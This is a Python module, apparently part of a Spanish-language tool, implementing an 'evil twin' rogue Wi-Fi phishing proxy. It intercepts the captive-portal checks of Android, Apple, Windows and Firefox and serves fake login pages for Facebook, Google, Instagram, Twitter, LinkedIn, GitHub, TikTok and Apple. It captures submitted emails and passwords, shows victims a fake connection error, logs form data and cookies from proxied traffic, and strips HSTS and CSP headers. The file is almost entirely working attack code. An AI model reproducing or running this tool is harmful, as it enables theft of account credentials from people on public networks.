import sys
import json
import logging
import socket
import threading
import ssl
import os
import time
from http.server import BaseHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import urlparse, parse_qs
import requests

from .config import ProxyConfig
from .capture import CredentialLogger
from .rewrite import ResponseRewriter
from . import templates as login_pages


CAPTIVE_PORTAL_PATHS = {
    "/generate_204", "/hotspot-detect.html", "/connecttest.txt",
    "/ncsi.txt", "/library/test/success.bin", "/redirect", "/gen_204",
}
CAPTIVE_PORTAL_HOSTS = {
    "connectivitycheck.gstatic.com", "clients3.google.com",
    "captive.apple.com", "www.msftconnecttest.com",
    "msftconnecttest.com", "detectportal.firefox.com",
    "network-test.debian.org",
}


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx/1.24.0"

    def __init__(self, config, logger, rewriter, *args, **kwargs):
        self.config = config
        self.logger = logger
        self.rewriter = rewriter
        super().__init__(*args, **kwargs)

    def _es_captive(self):
        host = self.headers.get("Host", "").lower()
        path = self.path.lower().split("?")[0]
        if path in CAPTIVE_PORTAL_PATHS:
            return True
        for cp_host in CAPTIVE_PORTAL_HOSTS:
            if cp_host in host:
                return True
        return False

    def _elegir_template(self):
        target = self.config.target_domain.lower()
        if "facebook" in target:
            return login_pages.facebook()
        if "instagram" in target:
            return login_pages.instagram()
        if "google" in target or "gmail" in target:
            return login_pages.google()
        if "x.com" in target or "twitter" in target:
            return login_pages.twitter()
        if "linkedin" in target:
            return login_pages.linkedin()
        if "github" in target:
            return login_pages.github()
        if "tiktok" in target:
            return login_pages.tiktok()
        return None

    def _enviar_html(self, html):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.end_headers()
        self.wfile.write(body)

    def _redirect_login(self):
        portal = self.config.portal_host()
        self.send_response(302)
        self.send_header("Location", "http://" + portal + "/login")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        if self._es_captive():
            self._responder_captive()
            return
        if self.path == "/login" or self.path == "/":
            template = self._elegir_template()
            if template:
                self._enviar_html(template)
                return
        if self.path in ("/login/facebook", "/login/google", "/login/twitter", "/login/apple"):
            self._enviar_html(self._login_social(self.path))
            return
        self._proxy_request("GET")

    def _login_social(self, path):
        if "/facebook" in path:
            return login_pages.facebook()
        if "/google" in path:
            return login_pages.google()
        if "/twitter" in path:
            return login_pages.twitter()
        return login_pages.para_personalizada("apple.com")

    def _responder_captive(self):
        host = self.headers.get("Host", "").lower()
        path = self.path.lower().split("?")[0]

        if "gstatic.com" in host or path == "/generate_204":
            self._redirect_login()
        elif "apple.com" in host or path == "/hotspot-detect.html":
            html = (
                "<!DOCTYPE html><html><head>"
                '<meta http-equiv="refresh" content="0;url=http://' + self.config.portal_host() + '/login">'
                "</head><body></body></html>"
            )
            self._enviar_html(html)
        elif "msftconnecttest.com" in host or path == "/connecttest.txt":
            self._redirect_login()
        elif "firefox.com" in host or path == "/redirect":
            self._redirect_login()
        elif path == "/ncsi.txt":
            self._redirect_login()
        elif path == "/library/test/success.bin":
            self._redirect_login()
        else:
            self._redirect_login()

    def do_POST(self):
        if self.path == "/login" or self.path.startswith("/login/"):
            self._capturar_credenciales()
            return
        self._proxy_request("POST")

    def _capturar_credenciales(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        data = dict(parse_qs(body, keep_blank_values=True))
        email = data.get("email", [""])[0]
        password = data.get("password", [""])[0]

        self.logger.log_credential(
            source_url=self.path,
            form_data=data,
            client_ip=self.client_address[0],
            user_agent=self.headers.get("User-Agent"),
        )

        print(f"\n{'='*60}")
        print(f"  CREDENCIAL CAPTURADA")
        print(f"  Email:    {email}")
        print(f"  Password: {password}")
        print(f"  IP:       {self.client_address[0]}")
        print(f"{'='*60}\n")

        html = """<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Error de conexion</title>
<style>
body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5;margin:0}
.container{text-align:center;padding:40px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:400px}
h1{color:#d93025;font-size:24px;margin-bottom:16px}
p{color:#5f6368;font-size:16px}
</style></head>
<body>
<div class="container">
<h1>Error de conexion</h1>
<p>No se pudo establecer conexion con el servidor. Verifica tu conexion e intenta de nuevo.</p>
</div>
</body>
</html>"""
        self._enviar_html(html)

    def _proxy_request(self, method):
        ip = self.client_address[0]
        url = self.config.get_target_url(self.path)

        body = None
        if method in {"POST", "PUT", "PATCH"}:
            length = int(self.headers.get("Content-Length", 0))
            if length:
                body = self.rfile.read(length)

        self.logger.log_request(method=method, url=self.path, headers=dict(self.headers), body=body, client_ip=ip)

        try:
            response = self._forward(method, url, body)
            self._procesar_respuesta(response, url)
        except requests.exceptions.ConnectionError:
            self.send_error(502, "Bad Gateway")
        except requests.exceptions.Timeout:
            self.send_error(504, "Gateway Timeout")
        except Exception:
            self.send_error(500, "Internal Server Error")

    def _forward(self, method, target_url, body=None):
        headers = dict(self.headers)
        headers["Host"] = self.config.target_host
        headers["Accept-Encoding"] = "identity"

        if body and method in {"POST", "PUT", "PATCH"}:
            data = self._parse_form(body)
            if data:
                self.logger.log_credential(
                    source_url=self.path,
                    form_data=data,
                    client_ip=self.client_address[0],
                    user_agent=self.headers.get("User-Agent"),
                )

        return requests.request(
            method=method, url=target_url, headers=headers, data=body,
            cookies=self._extract_cookies(), allow_redirects=False,
            timeout=30, verify=False,
        )

    def _procesar_respuesta(self, response, original_url):
        for header in ["connection", "keep-alive", "proxy-authenticate",
                       "proxy-authorization", "transfer-encoding", "upgrade"]:
            response.headers.pop(header, None)

        if response.headers.get("Location"):
            response.headers["Location"] = self.rewriter.rewrite_location_header(response.headers["Location"])

        response.headers.pop("Strict-Transport-Security", None)
        response.headers.pop("X-Frame-Options", None)
        response.headers.pop("Content-Security-Policy", None)

        body = response.content

        self.send_response(response.status_code)
        for name, value in response.headers.items():
            self.send_header(name, value)
        self.end_headers()
        if body and self.command != "HEAD":
            self.wfile.write(body)

    def _parse_form(self, body):
        if not body:
            return {}
        content_type = self.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            return dict(parse_qs(body.decode("utf-8", errors="replace"), keep_blank_values=True))
        return {}

    def _extract_cookies(self):
        header = self.headers.get("Cookie", "")
        cookies = {}
        if header:
            for item in header.split(";"):
                if "=" in item:
                    name, value = item.strip().split("=", 1)
                    cookies[name.strip()] = value.strip()
        return cookies


class ProxyTCPServer(TCPServer):
    allow_reuse_address = True
    allow_reuse_port = True

    def __init__(self, address, handler_class, *args, **kwargs):
        self._handler_class = handler_class
        super().__init__(address, None, *args, **kwargs)

    def finish_request(self, request, address):
        try:
            request.settimeout(2)
            first = request.recv(1, socket.MSG_PEEK)
            request.settimeout(None)
        except (socket.timeout, socket.error):
            request.settimeout(None)
            first = b""

        if first and first[0] == 0x16:
            try:
                request.close()
            except Exception:
                pass
        else:
            try:
                self._handler_class(request, address, self)
            except Exception:
                pass


class EvilTwinProxy:
    def __init__(self, config):
        self.config = config
        self.logger = CredentialLogger(
            capture_path=config.capture_path,
            target_name=config.target_host,
        )
        self.rewriter = ResponseRewriter(
            target_domain=config.target_domain,
            proxy_origin=config.proxy_origin,
            extra_domains=getattr(config, "extra_domains", []),
        )
        self.httpd = None
        self.httpsd = None

    def arrancar(self):
        factory = self._handler_factory()

        self.httpd = ProxyTCPServer(
            (self.config.listen_host, self.config.listen_port),
            factory,
        )
        self.httpd.allow_reuse_address = True
        print(f"  Proxy HTTP en http://0.0.0.0:{self.config.listen_port}")

        t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        t.start()

        cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "credentials", "cert.pem")
        key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "credentials", "key.pem")

        if os.path.exists(cert_path) and os.path.exists(key_path):
            try:
                self.httpsd = ProxyTCPServer(
                    (self.config.listen_host, 443),
                    factory,
                )
                self.httpsd.allow_reuse_address = True
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(cert_path, key_path)
                self.httpsd.socket = ctx.wrap_socket(self.httpsd.socket, server_side=True)
                print("  Proxy HTTPS en https://0.0.0.0:443")
                t2 = threading.Thread(target=self.httpsd.serve_forever, daemon=True)
                t2.start()
            except Exception as e:
                print(f"  [!] HTTPS no disponible: {e}")
                self.httpsd = None
        else:
            print("  [!] HTTPS: certificados no encontrados")
            self.httpsd = None

        print(f"  Target: {self.config.target_domain}")
        print()

    def _handler_factory(self):
        cfg = self.config
        log = self.logger
        rw = self.rewriter

        def factory(*args, **kwargs):
            return Handler(cfg, log, rw, *args, **kwargs)
        return factory

    def detener(self, silencioso=False):
        if self.httpd:
            self.httpd.server_close()
        if self.httpsd:
            self.httpsd.server_close()
        if not silencioso:
            resumen = self.logger.get_summary()
            print(f"\n  Credenciales: {resumen['total_credentials']}")
            print(f"  IPs unicas:   {resumen['unique_ips']}")
